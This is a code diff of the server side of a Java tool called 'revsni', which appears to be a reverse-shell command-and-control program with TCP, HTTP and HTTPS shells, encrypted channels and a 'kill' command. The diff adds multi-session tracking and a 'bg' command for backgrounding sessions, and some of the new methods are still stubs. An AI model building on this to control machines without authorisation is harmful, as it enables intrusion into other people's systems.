@@ -6,14 +6,23 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.security.NoSuchAlgorithmException;
 import java.security.spec.InvalidKeySpecException;
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.List;
 import java.util.Observable;
+import java.util.UUID;
+import java.util.Map.Entry;
 
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
 
+import com.revsni.Revsni;
 import com.revsni.common.Configuration;
+import com.revsni.common.Configuration.Mode;
 import com.revsni.server.http.HTTPShell;
 import com.revsni.server.https.HTTPSShell;
+import com.revsni.utils.SessionInfo;
+import com.revsni.utils.ThreadMonitor;
 
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -28,51 +37,35 @@ import org.apache.logging.log4j.Logger;
 
 
 @Deprecated
-public class Server extends Observable {
+public class Server extends Observable implements Runnable{
     private Configuration configuration;
-    private boolean running;
+    private volatile boolean running;
     private volatile int port;
     private volatile int portIn;
-    private SecretKey key;
-    private IvParameterSpec iv;
-    private boolean first = true;
+    private volatile SecretKey key;
+    private volatile IvParameterSpec iv;
+    private volatile boolean first = true;
     public volatile String shellType;
     private volatile Updater updater;
     private volatile HTTPShell httpShell;
     private volatile HTTPSShell httpsShell;
+    private volatile Listener listener;
+    public volatile ThreadMonitor threadMonitor;
+
+    //UUID, Name, IP, Port, Mode, Thread
+    public static volatile HashMap<UUID, SessionInfo<String, String, Integer, Mode, Thread>> sessions = new HashMap<>();
+    public static List<UUID> sessionList = new ArrayList<>();
 
     Logger logger = LogManager.getLogger(getClass());
 
 
 
-    public static void main(String[] args) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
-        //Menu for later usage when compiled etc.
-        /*
-        if (args.length < 2) {
-            printUsage();
-            System.exit(0);
-        }
-        if (args.length == 2) {
-            Server server = new Server();
-            String salt = generatePassOrSalt();
-            String pass = generatePassOrSalt();
-            
+    public Server(String ip, int port, String pass, String salt, ThreadMonitor monitor) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
         
-            server.initServer(args[0], Integer.parseInt(args[1]), salt, pass);
-        }
-        */
+        this.threadMonitor = monitor;
         
-        Server server = new Server();
-        
-        
-        server.initServer("127.0.0.1", 1331, "lol123", "lol123");
+        initServer(ip, port, pass, salt);
 
-        final Listener listener = new Listener(server);
-        Thread listenerThread = new Thread(listener);
-        listenerThread.start();
-
-        server.startServer();
-        listener.stopListening();
 
     }
 
@@ -111,7 +104,14 @@ public class Server extends Observable {
         }
     }
 
-    public void startServer() {
+    @Override
+    public void run() {
+        if(!isRunning() && first) {
+            listener = new Listener(this);
+            Thread listenerThread = new Thread(listener);
+            listenerThread.start();
+            System.out.println("Listener started!");
+        }
         while(isRunning()) {
             try {
                 String message;
@@ -170,8 +170,28 @@ public class Server extends Observable {
                             break;
                         case("mode"): printMode(); break;
                         case("kill"): notifyObservers("kill"); break;
-                        case("exit"): notifyObservers("exit"); return;
-                        case("encryption"): printEncryption(); break;     
+                        case("exit"): notifyObservers("exit"); Revsni.setActive(false); return;
+                        case("encryption"): printEncryption(); break;
+                        case("bg"):
+                            Revsni.setActiveHelper(true); 
+                            synchronized(threadMonitor) {
+                                try {
+                                    threadMonitor.wait();
+                                } catch(InterruptedException e) {
+
+                                }
+                            }
+                            System.out.print("\nRevsn [" + shellType + "] » ");
+                            break;  
+                            
+                        case("sessions"):
+                            printSessions();
+
+                            System.out.print("Which session you want to interact with? (type 'none' to exit): ");
+                            String decSession = bufferedReader.readLine();
+                            
+
+                            break;
                         default: 
                             if(shellType.equals("TCP")) {
                                 notifyObservers(message);
@@ -193,11 +213,12 @@ public class Server extends Observable {
             } catch (IOException e) {
 
                 e.printStackTrace(); 
-            } 
+            }
             finally {
                 setRunning(false);
                 logger.info("Server is shutting down");
                 try {
+                    listener.stopListening();
                     Thread.sleep(10000);
                 }
                 catch (InterruptedException e) {
@@ -270,6 +291,36 @@ public class Server extends Observable {
         //Implement applying config to TCP, HTTP, HTTPS and stuff.
     }
 
+
+    //Session handling
+
+    public static void addSession(UUID uuid, String name, String ipAddr, int port, Mode mode, Thread thread) {
+        //UUID, Name, IP, Port, Mode, Thread
+
+        sessions.put(uuid, new SessionInfo<String,String,Integer,Mode,Thread>(name, ipAddr, port, mode, thread));
+   }
+
+   public static void removeSession(UUID uuid) {
+       sessions.remove(uuid);
+   }
+
+   public static void removeSession(String name) {
+       if(sessions.values().stream().findAny().get().name.contains(name)) {
+           for(Entry<UUID, SessionInfo<String, String, Integer, Mode, Thread>> entry : sessions.entrySet()) {
+               if(entry.getValue().name.equals(name)) {
+                   sessions.remove(entry.getKey());
+               }
+           }
+       }
+   }
+
+
+   private void printSessions() {
+
+
+   }
+
+
     //Menus
 
     private void printHelp() {
@@ -282,6 +333,7 @@ public class Server extends Observable {
                           +"encryption  -   Change between different encryptions or combine them\n"
                           +"switch      -   Switch Shell\n"
                           +"configure   -   Configure Revsn\n"
+                          +"bg          -   Background Session\n"
                           +"quit        -   Closes connection\n"
                           +"\n");
     }
